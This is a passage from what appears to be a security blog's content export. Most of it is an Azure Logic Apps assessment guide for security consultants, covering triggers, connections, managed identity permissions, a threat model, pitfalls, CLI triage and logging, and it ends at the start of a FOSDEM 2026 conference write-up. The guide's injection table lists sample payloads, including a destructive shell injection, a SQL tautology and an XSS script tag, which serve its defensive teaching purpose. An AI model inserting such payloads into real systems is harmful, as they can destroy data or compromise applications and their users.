validated Service Bus Message queue trigger Replay attacks, unauthorized message access Kafka Stream processing Consumer group management, authentication to Kafka cluster 3. Actions (What It Does) Actions are the steps in your workflow. Each action is a potential risk:\nTrigger (HTTP Request) → Action 1: Get data from API → Action 2: Transform data → Action 3: Send to database → Action 4: Notify via email Each action typically uses a connection (see below) and can access data from previous steps. This is where injection attacks come into play - if user input reaches an action, can it be exploited?\n4. Connections (Authentication) Connections are how Logic Apps authenticate to services. Critical security surface:\nConnection Target Service Auth Method Risk Level Connection 1 Azure Key Vault Managed Identity ✅ Secure Connection 2 Office 365 OAuth token ✅ Reasonable Connection 3 SQL Database Connection string ❌ RISK! Connection 4 Cosmos DB Connection string/Managed Identity 🟡 Mixed (depends on auth) Connection 5 Third-party API API key stored ❌ RISK! Connection types and risks:\nManaged Identity: No secrets. Uses Microsoft Entra ID. ✅ Secure OAuth: Tokens stored by platform. Refresh periodically. ✅ Reasonable Connection String/API Key: Credentials stored in API Connection resource. ❌ Risky 5. Integration Account (B2B) For B2B scenarios (AS2, X12, EDI), Logic Apps use an Integration Account. Contains:\nPartners: Trading partner configurations. Agreements: B2B protocols and certificates. Certificates: Encryption/signing certificates. Risk: If compromised, attacker can impersonate trading partners or decrypt B2B messages.\n6. Managed Identity A Logic App can have a system-assigned or user-assigned managed identity. This is how it authenticates to other Azure services:\nLogic App Managed Identity → Accesses Azure Key Vault → Accesses Azure Storage → Accesses Azure SQL → Accesses Cosmos DB Critical assessment question: What permissions does the managed identity have? If it\u0026rsquo;s Contributor across the subscription, you\u0026rsquo;ve got massive blast radius.\nKey Configuration Areas: What Can Be Controlled? When assessing Logic Apps, you need to understand what\u0026rsquo;s configurable and what the implications are.\n1. Authentication and Access Control HTTP Trigger Authentication:\nLogic Apps exposing HTTP endpoints can enforce authentication:\nMethod Risk Level Notes None 🔴 HIGH Public endpoint - anyone can trigger Microsoft Entra ID 🟢 LOW Requires valid OAuth token Access Key 🟡 MEDIUM Query string/header key - can be leaked IP Restrictions 🟡 MEDIUM Whitelist specific IPs - depends on quality Assessment questions:\nIs the HTTP trigger public? What authentication is enforced? Are IP restrictions in place? Are they too permissive (e.g., 0.0.0.0/0)? If using Access Keys, are they rotated? Are they stored securely? If using Microsoft Entra ID, what permissions does the calling identity have? 2. Managed Identity Permissions The managed identity assigned to the Logic App defines what it can do:\n{ \u0026#34;identity\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;SystemAssigned\u0026#34; }, \u0026#34;properties\u0026#34;: { \u0026#34;principalId\u0026#34;: \u0026#34;xxx-xxx-xxx\u0026#34; } } Assessment:\nFind the managed identity (principalId). Check Microsoft Entra ID role assignments for that identity. Assess scope and permissions: Does it have Contributor on the subscription? (Excessive) Does it have Reader on Key Vault? (Read-only, reasonable) Does it have specific role on SQL Database? (Least privilege) Risk example:\nLogic App (Managed Identity) → Has Contributor on Resource Group → Can create new Logic App → Can modify existing Logic App workflows → Attacker modifies workflow to exfiltrate data 3. Connection Security Review how Logic Apps authenticate to target services:\n\u0026#34;connection\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;azurekeyvault\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ManagedServiceIdentity\u0026#34; } Good:\n\u0026#34;connection\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;azurekeyvault\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ManagedServiceIdentity\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;/subscriptions/xxx/resourceGroups/xxx/providers/Microsoft.ManagedIdentity/userAssignedIdentities/xxx\u0026#34; } Bad:\n\u0026#34;connection\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;sql-database\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ConnectionString\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;Server=tcp:xxx.database.windows.net;Database=xxx;User Id=xxx;Password=SECRET_HERE;\u0026#34; } Bad (Cosmos DB):\n\u0026#34;connection\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;cosmos-db\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ConnectionString\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;AccountEndpoint=https://xxx.documents.azure.com:443/;AccountKey=SECRET_HERE;\u0026#34; } Good (Cosmos DB with Managed Identity):\n\u0026#34;connection\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;cosmos-db\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ManagedServiceIdentity\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;/subscriptions/xxx/resourceGroups/xxx/providers/Microsoft.ManagedIdentity/userAssignedIdentities/xxx\u0026#34; } Assessment questions:\nAre connections using Managed Identities where possible? Are connection strings or API keys stored directly in the Logic App? If connection strings are used, are they stored in Key Vault? Do connections use OAuth tokens (which expire) vs static credentials? 4. Workflow Definition Security The workflow definition is JSON. Look for:\nSecrets in workflow:\n{ \u0026#34;actions\u0026#34;: { \u0026#34;HTTP\u0026#34;: { \u0026#34;inputs\u0026#34;: { \u0026#34;authentication\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;Raw\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;Bearer eyJ0eXAiOiJKV1QiLCJ...\u0026#34; ← SECRET! } } } } } Hardcoded values:\n{ \u0026#34;actions\u0026#34;: { \u0026#34;Send_Email\u0026#34;: { \u0026#34;inputs\u0026#34;: { \u0026#34;to\u0026#34;: \u0026#34;admin@company.com\u0026#34;, ← Hardcoded \u0026#34;subject\u0026#34;: \u0026#34;Alert\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;@{triggerBody()}\u0026#34; } } } } Assessment questions:\nAre secrets embedded in the workflow definition? Are hard-coded values present (emails, URLs, paths)? Is the workflow definition in source control (and is it public)? Who has permission to modify the workflow? 5. Data Flow and Injection Points Trace data through the workflow to identify injection risks:\nHTTP Request (user input) → Action 1: Parse JSON (user.username) → Action 2: Query SQL (SELECT * FROM users WHERE username = \u0026#39;@{user.username}\u0026#39;) → Action 3: Query Cosmos DB (SELECT * FROM c WHERE c.username = \u0026#39;@{user.username}\u0026#39;) → Action 4: Send email Injection risks:\nInjection Type Where It Happens Example SQL Injection SQL action with user input ' OR '1'='1 NoSQL Injection Cosmos DB query with user input {username: {$or: [{userId: \u0026quot;admin\u0026quot;}, {userId: \u0026quot;attacker\u0026quot;}]} Command Injection Execute action with shell command ; rm -rf / XSS HTML output, email body \u0026lt;script\u0026gt;alert('xss')\u0026lt;/script\u0026gt; Log Injection Logging action with user input \\nERROR: Critical failure Assessment:\nDoes user input reach actions that execute queries or commands? Are inputs validated before use? Are outputs encoded (HTML, URL, JSON)? Does the workflow use parameterized queries for SQL or Cosmos DB? 6. DDoS and Rate Limiting Logic Apps can be overwhelmed by:\nExcessive HTTP requests (flood the trigger) Large payloads (memory exhaustion) Long-running workflows (resource exhaustion) Configuration options:\nConcurrency limits: How many workflow instances run simultaneously? Timeouts: Maximum duration per workflow run. Retry policies: How many times to retry on failure? IP restrictions: Block known bad IPs. Assessment questions:\nAre concurrency limits configured appropriately? Are timeouts set to prevent runaway workflows? Is there a retry policy that could amplify failures? Are IP restrictions used to block known threats? 7. Supply Chain and Connector Risks Logic Apps use connectors to integrate with services. Each connector is a dependency:\nLogic App → Connector A (Third-party API) → Connector B (Azure Service) → Connector C (Custom connector) Risks:\nVulnerable connector: Third-party connector has a vulnerability. Supply chain attack: Connector repository compromised, malicious code deployed. EOL connectors: No longer maintained, may have known CVEs. Assessment:\nWhat connectors are in use? Are they first-party (Microsoft) or third-party? Are connectors up-to-date? When were they last modified? Are custom connectors used? Who developed them? Are they audited? Are there any connectors with known vulnerabilities (check CVE database)? 8. Integration Account Security If an Integration Account is used, assess:\nCertificates:\nAre encryption/signing certificates stored securely? Are they near expiry? Are private keys accessible only to authorized identities? Partners and Agreements:\nAre trading partners validated before adding? Are agreements reviewed for security implications? Can an unauthorized partner be added? Assessment questions:\nWho has access to the Integration Account? Are certificates stored in Key Vault? Is there an audit trail for partner/agreement changes? 9. Network Isolation (Standard/ISE Only) For Standard and ISE deployments, network security controls are available:\nPrivate Endpoints:\nLogic App accessible only from private VNet No public internet exposure Traffic stays within Azure backbone VNet Integration:\nOutbound traffic routes through VNet Can access on-premises resources via ExpressRoute/VPN Network security groups (NSGs) apply Deployment comparison:\nFeature Consumption Standard ISE Network isolation ❌ No ✅ VNet integration ✅ Dedicated VNet Private endpoints ❌ No ✅ Yes ✅ Yes Static outbound IPs ❌ No ✅ NAT Gateway ✅ Built-in On-prem connectivity Via gateway ✅ Direct ✅ Direct Assessment questions:\nIs network isolation required for this Logic App\u0026rsquo;s sensitivity level? Are private endpoints configured for Standard/ISE deployments? Are NSGs restricting traffic appropriately? Is outbound traffic monitored (firewall, NSG flow logs)? 10. Secured Parameters and Actions Logic Apps support \u0026ldquo;secure\u0026rdquo; parameters and actions that mask values in run history:\n\u0026#34;parameters\u0026#34;: { \u0026#34;apiKey\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;securestring\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;...\u0026#34; } } What gets secured:\nInput/output values marked as securestring or secureobject Not visible in run history or diagnostics Prevents accidental exposure in logs Assessment questions:\nAre sensitive parameters marked as secure? Is run history enabled? Who can access it? Are secured actions used for sensitive operations? Threat Model: What Attackers Target Threat 1: Unauthorized Trigger Execution Scenario: Attacker finds a public HTTP trigger and sends malicious payload.\nImpact:\nData exfiltration (if trigger returns sensitive data) Lateral movement (if trigger modifies other resources) DDoS (if attacker floods the trigger) Mitigation:\nEnforce authentication (Microsoft Entra ID, Access Keys). Restrict inbound IPs. Validate and sanitize inputs. Monitor for anomalous patterns. Threat 2: Credential Theft via Connections Scenario: Connection strings/API keys stored in Logic App are exposed.\nImpact:\nAttacker accesses target services directly. Lateral movement across services. Privilege escalation if credentials are over-privileged. Mitigation:\nUse Managed Identities where possible. Store secrets in Key Vault, not Logic Apps. Rotate credentials regularly. Use OAuth tokens (expire) instead of static keys. Threat 3: Privilege Escalation via Managed Identity Scenario: Logic App\u0026rsquo;s managed identity has excessive permissions.\nImpact:\nLogic App can create/modify resources it shouldn\u0026rsquo;t. Attacker exploits workflow to access unrelated services. Full tenant compromise if identity has global permissions. Mitigation:\nFollow principle of least privilege. Use scoped identities (resource group, not subscription). Regularly audit role assignments. Just-in-time access where possible. Threat 4: Injection Attacks Scenario: User input reaches an action without validation.\nImpact:\nSQL injection → SQL Database compromise. NoSQL injection → Cosmos DB unauthorized access. Command injection → Server compromise. XSS → Client-side attacks. Log injection → Hide malicious activity. Mitigation:\nValidate all inputs (type, length, format). Use parameterized queries for SQL and Cosmos DB. Encode outputs (HTML, URL, JSON). Don\u0026rsquo;t trust user input. Threat 5: Supply Chain Attack via Connector Scenario: Malicious connector deployed or legitimate connector has vulnerability.\nImpact:\nData exfiltration via connector. Execution of arbitrary code. Compromise of target service. Mitigation:\nPrefer first-party connectors (Microsoft) over third-party. Regularly update connectors. Audit custom connectors. Monitor connector usage and behavior. Threat 6: Lateral Movement Across Tenants Scenario: Logic App connects to multiple tenants (multi-tenant connectors).\nImpact:\nAttacker moves from compromised tenant to target tenant. Cross-tenant data access. Bypassing tenant security controls. Mitigation:\nMinimize multi-tenant connector usage. Validate cross-tenant access requirements. Monitor cross-tenant activity. Use tenant-specific identities where possible. Common Pitfalls to Identify Pitfall 1: Public HTTP Triggers with No Authentication What you\u0026rsquo;ll see:\nHTTP trigger exposed to internet Authentication set to \u0026ldquo;None\u0026rdquo; No IP restrictions Risk: Anyone can trigger the workflow.\nPitfall 2: Secrets in Workflow Definition What you\u0026rsquo;ll see:\nConnection strings in workflow JSON API keys in action inputs Hard-coded credentials in parameters Risk: Anyone with access to the Logic App (or source control) has credentials.\nPitfall 3: Over-Privileged Managed Identities What you\u0026rsquo;ll see:\nManaged Identity has Contributor on subscription Same identity used across multiple Logic Apps No separation of duties Risk: Compromised Logic App can modify entire subscription.\nPitfall 4: Missing Input Validation What you\u0026rsquo;ll see:\nUser input passed directly to SQL or Cosmos DB queries No validation before using trigger body No sanitization before sending to external APIs Risk: Injection attacks (SQL, NoSQL, command, XSS).\nPitfall 5: No Rate Limiting What you\u0026rsquo;ll see:\nConcurrency limit set to maximum (or not set) No timeout configured No retry policy or exponential backoff Risk: DDoS, resource exhaustion, cascading failures.\nPitfall 6: Insufficient Logging and Monitoring What you\u0026rsquo;ll see:\nNo diagnostic settings configured No Application Insights integration No alerts on failures or anomalies Risk: Attacks go undetected, difficult to investigate.\nAssessment Checklist (For Your Use) High-Level Questions:\nWhat triggers are exposed? How are they authenticated? What services does the Logic App connect to? How? What permissions does the Logic App have? Are they appropriate? Where does user input come from? How is it validated? What data flows through the workflow? Where does it go? How is the Logic App deployed and versioned? What logging and monitoring is in place? Quick Wins:\nPublic triggers have authentication (Microsoft Entra ID or Access Keys) Managed Identities used instead of connection strings Secrets stored in Key Vault, not Logic Apps IP restrictions on public triggers Input validation before using trigger body Diagnostic settings configured Role assignments follow least privilege Connections are up-to-date and from trusted sources Fast CLI Triage (Useful on Day 1) If you get given a subscription and told \u0026ldquo;we use Logic Apps\u0026rdquo;, start by finding what exists.\nList Consumption/ISE Logic Apps (workflow resources):\naz resource list \\ --resource-type Microsoft.Logic/workflows \\ --query \u0026#34;[].{name:name, rg:resourceGroup, location:location, id:id}\u0026#34; \\ -o table List Logic App Standard apps (workflowapp sites):\naz resource list \\ --resource-type Microsoft.Web/sites \\ --query \u0026#34;[?contains(kind, \u0026#39;workflowapp\u0026#39;)].{name:name, rg:resourceGroup, location:location, id:id}\u0026#34; \\ -o table Enumerate API connections (where a lot of the secrets hide):\naz resource list \\ --resource-type Microsoft.Web/connections \\ --query \u0026#34;[].{name:name, rg:resourceGroup, location:location, id:id}\u0026#34; \\ -o table For a given Logic App (Consumption), pull the managed identity principal ID:\naz resource show \\ --ids \u0026#34;/subscriptions/SUB/resourceGroups/RG/providers/Microsoft.Logic/workflows/WORKFLOW\u0026#34; \\ --query \u0026#34;identity.principalId\u0026#34; \\ -o tsv Then list its Azure RBAC assignments (this is usually where the worst findings are):\naz role assignment list \\ --assignee PRINCIPAL_ID \\ --all \\ --query \u0026#34;[].{role:roleDefinitionName, scope:scope}\u0026#34; \\ -o table For a given workflow, spot HTTP request triggers quickly:\naz resource show \\ --ids \u0026#34;/subscriptions/SUB/resourceGroups/RG/providers/Microsoft.Logic/workflows/WORKFLOW\u0026#34; \\ --query \u0026#34;properties.definition.triggers\u0026#34; \\ -o json \\ | jq \u0026#39;to_entries[] | select(.value.type==\u0026#34;Request\u0026#34;) | {trigger:.key, kind:(.value.kind // \u0026#34;\u0026#34;), inputs:(.value.inputs // {})}\u0026#39; This doesn\u0026rsquo;t tell you whether the endpoint is publicly reachable (networking and auth still matter), but it tells you where the internet-facing mistakes usually are.\nBest Practices for Secure Logic Apps 1. Use Managed Identities { \u0026#34;identity\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;SystemAssigned\u0026#34; } } Grant the identity specific permissions (e.g., Key Vault Secrets User, not Contributor).\n2. Use Managed Identities or RBAC for Cosmos DB Cosmos DB supports Managed Identities and RBAC:\n\u0026#34;connection\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;cosmos-db\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ManagedServiceIdentity\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;/subscriptions/xxx/resourceGroups/xxx/providers/Microsoft.ManagedIdentity/userAssignedIdentities/xxx\u0026#34; } Avoid account keys:\n\u0026#34;connection\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;cosmos-db\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ConnectionString\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;AccountEndpoint=https://xxx.documents.azure.com:443/;AccountKey=SECRET_HERE;\u0026#34; } Grant the managed identity Data Contributor or other role-based access to Cosmos DB instead of using account keys.\n3. Store Secrets in Key Vault \u0026#34;inputs\u0026#34;: { \u0026#34;secretUri\u0026#34;: \u0026#34;@parameters(\u0026#39;$connections\u0026#39;)[\u0026#39;azurekeyvault\u0026#39;][\u0026#39;secretUri\u0026#39;]\u0026#34; } Never embed secrets in workflow definitions.\n4. Validate All Inputs \u0026#34;actions\u0026#34;: { \u0026#34;Validate_Input\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;If\u0026#34;, \u0026#34;expression\u0026#34;: { \u0026#34;and\u0026#34;: [ { \u0026#34;not\u0026#34;: \u0026#34;contains(triggerBody()?[\u0026#39;username\u0026#39;], \u0026#39;;\u0026#39;)\u0026#34; }, { \u0026#34;less\u0026#34;: [ \u0026#34;length(triggerBody()?[\u0026#39;username\u0026#39;]), 50 ] } ] } } } Reject invalid inputs early in the workflow.\n5. Use Parameterized Queries (SQL and Cosmos DB) SQL parameterized query:\n\u0026#34;actions\u0026#34;: { \u0026#34;Query_SQL\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;Query\u0026#34;, \u0026#34;inputs\u0026#34;: { \u0026#34;query\u0026#34;: \u0026#34;SELECT * FROM users WHERE username = @username\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;@triggerBody()?[\u0026#39;username\u0026#39;]\u0026#34; } } } } Cosmos DB parameterized query (NoSQL):\n\u0026#34;actions\u0026#34;: { \u0026#34;Query_Cosmos\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;QueryDocuments\u0026#34;, \u0026#34;inputs\u0026#34;: { \u0026#34;collectionId\u0026#34;: \u0026#34;users\u0026#34;, \u0026#34;query\u0026#34;: \u0026#34;SELECT * FROM c WHERE c.username = @username\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;@username\u0026#34;: \u0026#34;@triggerBody()?[\u0026#39;username\u0026#39;]\u0026#34; } } } } Using parameters prevents injection attacks for both SQL and NoSQL databases.\n6. Implement Rate Limiting For Logic Apps, \u0026ldquo;rate limiting\u0026rdquo; usually means:\nConcurrency control on triggers (stop someone from fanning out 1,000 parallel runs) Timeouts on actions (stop workflows hanging forever) Retry policies with backoff (stop an outage turning into a retry storm) Example request trigger with concurrency control:\n\u0026#34;triggers\u0026#34;: { \u0026#34;When_a_HTTP_request_is_received\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;Request\u0026#34;, \u0026#34;kind\u0026#34;: \u0026#34;Http\u0026#34;, \u0026#34;inputs\u0026#34;: { \u0026#34;schema\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;id\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34; } }, \u0026#34;required\u0026#34;: [\u0026#34;id\u0026#34;] } }, \u0026#34;runtimeConfiguration\u0026#34;: { \u0026#34;concurrency\u0026#34;: { \u0026#34;runs\u0026#34;: 1 } } } } Example action timeout + retry policy:\n\u0026#34;actions\u0026#34;: { \u0026#34;Call_External_API\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;Http\u0026#34;, \u0026#34;inputs\u0026#34;: { \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;uri\u0026#34;: \u0026#34;https://api.example.com/data\u0026#34; }, \u0026#34;timeout\u0026#34;: \u0026#34;PT30S\u0026#34;, \u0026#34;retryPolicy\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;exponential\u0026#34;, \u0026#34;interval\u0026#34;: \u0026#34;PT5S\u0026#34;, \u0026#34;count\u0026#34;: 3 } } } Prevent runaway workflows and DDoS.\n7. Enable Diagnostic Logging If you do nothing else, get runtime logs into Log Analytics.\nFirst, discover what diagnostic categories exist for the resource (they vary by resource type and SKU):\naz monitor diagnostic-settings categories list \\ --resource \u0026#34;/subscriptions/SUB/resourceGroups/RG/providers/Microsoft.Logic/workflows/WORKFLOW\u0026#34; \\ -o table Then create a diagnostic setting to ship logs to a workspace:\naz monitor diagnostic-settings create \\ --name send-to-law \\ --resource \u0026#34;/subscriptions/SUB/resourceGroups/RG/providers/Microsoft.Logic/workflows/WORKFLOW\u0026#34; \\ --workspace \u0026#34;/subscriptions/SUB/resourceGroups/RG/providers/Microsoft.OperationalInsights/workspaces/LAW\u0026#34; \\ --logs \u0026#39;[{\u0026#34;category\u0026#34;:\u0026#34;WorkflowRuntime\u0026#34;,\u0026#34;enabled\u0026#34;:true}]\u0026#39; KQL starter queries (field names vary, so start by exploring):\nAzureDiagnostics | where ResourceProvider =~ \u0026#34;MICROSOFT.LOGIC\u0026#34; | where Category =~ \u0026#34;WorkflowRuntime\u0026#34; | take 50 Find failing runs:\nAzureDiagnostics | where ResourceProvider =~ \u0026#34;MICROSOFT.LOGIC\u0026#34; | where Category =~ \u0026#34;WorkflowRuntime\u0026#34; | where status_s !~ \u0026#34;Succeeded\u0026#34; | summarize count() by status_s, Resource | order by count_ desc Track control-plane changes (who changed a workflow):\nAzureActivity | where ResourceProviderValue =~ \u0026#34;MICROSOFT.LOGIC\u0026#34; | where OperationNameValue has \u0026#34;workflows\u0026#34; | project TimeGenerated, Caller, OperationNameValue, ActivityStatusValue, ResourceGroup, Resource | order by TimeGenerated desc If you can\u0026rsquo;t answer \u0026ldquo;who changed this workflow\u0026rdquo; and \u0026ldquo;when did runs start failing\u0026rdquo; inside 60 seconds, you don\u0026rsquo;t have monitoring. You have vibes.\n8. Regular Security Audits Review role assignments quarterly. Rotate Access Keys monthly. Review connector updates monthly. Audit workflow changes (source control, activity logs). Further Reading Azure Logic Apps Security Documentation Managed Identities for Azure Resources Azure Key Vault Security Azure RBAC Best Practices OWASP Injection Flaws Conclusion Azure Logic Apps are powerful but add significant attack surface if not secured correctly. Your job as a consultant isn\u0026rsquo;t to tick boxes - it\u0026rsquo;s to understand the architecture, identify the risks, and provide actionable recommendations.\nFocus on:\nAuthentication and access control (who can trigger what?) Secrets management (where are credentials stored?) Permissions and identities (what can the Logic App do?) Data flow and injection (what reaches critical actions?) Monitoring and logging (can you detect when something goes wrong?) Security isn\u0026rsquo;t a checklist. It\u0026rsquo;s understanding the system and identifying where it can be broken. This guide should give you the foundation to do that for Azure Logic Apps.\nThis guide is based on real-world security assessments of Azure environments. Always validate findings with the environment owner before reporting.\n","date":"6 Feb 2026","permalink":"https://gazsecops.github.io/posts/azure-logic-apps-security-guide/","summary":"\u003cp\u003eAzure Logic Apps are everywhere in modern cloud architectures. They\u0026rsquo;re the glue between services - orchestrating workflows, connecting APIs, moving data between systems. But from a security perspective, they\u0026rsquo;re also potential attack surfaces if configured poorly.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Your job as a consultant isn't to tick boxes - it's to understand the architecture, identify the risks, and provide actionable recommendations. Security isn't a checklist. It's understanding the system and identifying where it can be broken.\"\n\u003c/aside\u003e\n\u003cp\u003eThis guide is for cyber security consultants assessing environments that use Azure Logic Apps. It covers the architecture, key configuration areas that matter for security, threat modeling, and common pitfalls to look out for. It\u0026rsquo;s about understanding what\u0026rsquo;s configurable, what the threats are, and where things typically go wrong.\u003c/p\u003e\n\u003cp\u003eLogic Apps are interesting from a security perspective because they sit at the intersection of multiple services. They\u0026rsquo;re serverless (no infrastructure to manage), highly configurable (1000+ connectors), and often have significant permissions (managed identities with broad access). When misconfigured, they become pivot points for lateral movement, data exfiltration, or supply chain attacks. They\u0026rsquo;re also easy to overlook in security assessments because they\u0026rsquo;re \u0026ldquo;just workflow automation\u0026rdquo; - until you realize they have Contributor access to your entire subscription.\u003c/p\u003e","tags":["azure","security","serverless","logic-apps","cloud-security"],"title":"Azure Logic Apps Security: A Guide for Cyber Security Consultants"},{"content":"Just back from Brussels for FOSDEM 2026. Always brilliant. Solid technical content, interesting people, too much Belgian beer. Here\u0026rsquo;s what I took away from the best bits.\nThis year\u0026rsquo;s highlights included some genuinely useful Go tooling (OOMProf for debugging memory issues with eBPF), the NixOS crowd showing off proper zero-trust infrastructure for homelabs using TPM attestation, and Daniel Stenberg reminding everyone that we\u0026rsquo;re wasting time on AI hype while basic security problems go unfixed. Also covered: containers, systemd integration, and why Belgian beer is dangerous when you\u0026rsquo;re trying to explain TLS to strangers.\n\"Met this bloke who insisted on buying rounds of 12% ABV stuff. Being British, I couldn't say no to free beer. Mistake. Next thing I know, I'm explaining how TLS works to someone who definitely doesn't care, and they're nodding along politely because I've had too many. Classic.\" The technical content was strong, but the real value of FOSDEM is always the people. Walking around ULB campus surrounded by folks who wrote half the software you use daily, having random conversations that turn into collaborations - that\u0026rsquo;s what makes it worth the trip.\nGo Devroom Highlights The Go track had some good content this year.\nOOMProf: Profiling Go Heap Memory at OOM Time Speaker: Tommy Reilly\nThis was one of the most practical Go talks - OOMProf helps you profile Go heap memory exactly when your application runs out of memory. Instead of guessing what caused the OOM, you get actual heap dumps and allocation traces from the crash moment.\nThe approach is brilliant - hook into Go\u0026rsquo;s runtime using eBPF programs that listen to Linux kernel tracepoints involved in OOM killing. When the kernel is about to kill your process, OOMProf captures a memory profile before the process is dead and gone. The profile can be logged as a pprof file or sent to a Parca server for storage and analysis. No more \u0026ldquo;works on my machine\u0026rdquo; debugging where you can\u0026rsquo;t reproduce the issue because you\u0026rsquo;re missing the critical data.\nWatch: OOMProf on FOSDEM schedule\nGarbage Collection Improvements There was interesting work on garbage collection - talks about reducing pause times through incremental collection and better work distribution. The Go team is experimenting with distributing GC work across goroutines instead of stopping the world for a full collection. The new approach uses generational GC techniques and smarter heap sizing heuristics.\nBenchmarks showed pause times dropping from 10-20ms to under 5ms for typical workloads. For low-latency systems - think trading platforms, real-time analytics, game servers - this matters.\nTrade-off is slightly higher CPU usage during normal operation (around 2-5% overhead), but much better worst-case pause times. Worth it if latency P99s matter to your workload. The work is still experimental but targeting Go 1.25 or 1.26.\nGo Module Security Security in the Go ecosystem got attention. Talks covered sandboxing Go module downloads and builds - running each go get in isolated containers or VMs, validating checksums against the Go checksum database, restricting download hosts via network policies, and using SLSA provenance to verify build integrity.\nProblem being solved: supply chain attacks. If maintainer credentials get compromised or a popular package gets backdoored, malicious code can enter dependency trees silently. The ecosystem needs defense in depth - checksum validation catches tampering, sandboxing limits blast radius, provenance tracking helps audit what actually got built.\nPractical tools discussed: go-safer for sandboxed builds, integration with Sigstore for signing, and upcoming changes to the Go toolchain to make verification easier. Reality is adoption will be slow. Most teams don\u0026rsquo;t think about this until something breaks. Better CI/CD integration (GitHub Actions templates, GitLab CI modules) would help mainstream adoption.\neBPF and Go Using eBPF to instrument Go applications without recompilation. Talks showed USDT (User Statically-Defined Tracing) probes mapped to eBPF programs, hot reload of tracing logic, zero overhead when disabled.\nThe Go runtime now includes USDT probes at key points - goroutine creation/destruction, GC start/stop, function entry/exit for traced functions. You can attach eBPF programs to these probes and extract rich runtime data: goroutine scheduling latency, GC pause distributions, function call graphs, memory allocation patterns - all from kernel space without modifying or recompiling your application.\nPractical use cases: debugging production goroutine leaks, profiling GC impact on latency-sensitive endpoints, tracing request flows through complex microservices. Just attach an eBPF program and trace production workloads.\nDownside is the learning curve. eBPF tooling is still rough - lots of C code, complex kernel interactions, limited debugging. You need both Go internals knowledge and eBPF expertise to get real value. Tools like bpftrace and ebpf-go help, but there\u0026rsquo;s still a gap between \u0026ldquo;hello world\u0026rdquo; and production-ready observability.\nGotwebd: Browsing Git Repositories on the Web Speakers: Stefan Sperling, Omar Polo\nThis talk covered gotwebd, a web interface for browsing Git repositories. It\u0026rsquo;s part of the Game of Trees project from the OpenBSD community - building a new version control system that keeps what makes Git great, fixes what makes it hard, and adds new features.\nGotwebd has some unique features: privsep design with sandboxing, built-in SSH authentication for access control (which also protects against AI scraping), and the ability to serve static web content directly from Git repositories without needing external hosting.\nWatch: Gotwebd on FOSDEM schedule\nTinyGo on Embedded TinyGo pushing Go into embedded space. Talks covered memory footprint reduction (binaries under 100KB for simple programs), hardware acceleration support (DMA, hardware crypto), and WebAssembly targets for running in browsers or edge runtimes.\nKey wins: Cross-compilation to ARM Cortex-M, RISC-V, AVR. Direct hardware access via memory-mapped I/O. Goroutines work on bare metal (with caveats). Garbage collection tuned for constrained memory.\nFor embedded work where you want Go instead of C, TinyGo is improving fast. Still missing standard library features (no net/http, limited reflect), but for bare-metal work - reading sensors, controlling motors, IoT devices - it\u0026rsquo;s surprisingly capable. The community is building device drivers for common peripherals.\nThe debugging story is weaker than C toolchains. GDB integration exists but is rough. If you\u0026rsquo;re serious about embedded development (automotive, medical devices), you\u0026rsquo;ll hit that limitation. For hobby projects and less critical systems, it\u0026rsquo;s usable today.\nMain Track Highlights Evolving Git for the Next Decade Speaker: Patrick Steinhardt\nThe Git project turned 20 years old in 2025, and this talk covered what\u0026rsquo;s next. Git has taken over the world of version control, but it\u0026rsquo;s far from perfect. The talk covered recent additions that make Git easier to use - better UX, performance improvements, and proper support for large binary files.\nRecent improvements discussed: better error messages that actually tell you what went wrong, performance work on massive repositories (Microsoft-scale monorepos), partial clone support to avoid downloading entire histories, and ongoing work on better handling of large binary files without destroying repository size.\nKey takeaway: Git isn\u0026rsquo;t done. It\u0026rsquo;s got warts that developers complain about daily (confusing commands, inconsistent flags, poor performance on Windows), and the project is actively fixing them. The Git maintainers are committed to backwards compatibility while still improving usability. Recent changes address arbitrary limitations (path lengths, file counts) and performance issues (filesystem operations, network protocols).\nThe talk covered upcoming features targeting the next 5-10 years: better support for monorepos, improved merge strategies, built-in code review workflows, and modern authentication mechanisms.\nWatch: Evolving Git for the Next Decade\nNixOS Devroom The NixOS devroom always delivers. This year\u0026rsquo;s lineup was particularly strong on the security and infrastructure automation side.\nBootstrapping Cryptographic Trust with NixOS Speaker: Arian van Putten\nThis was the standout talk for me. The whole premise is mad but brilliant - 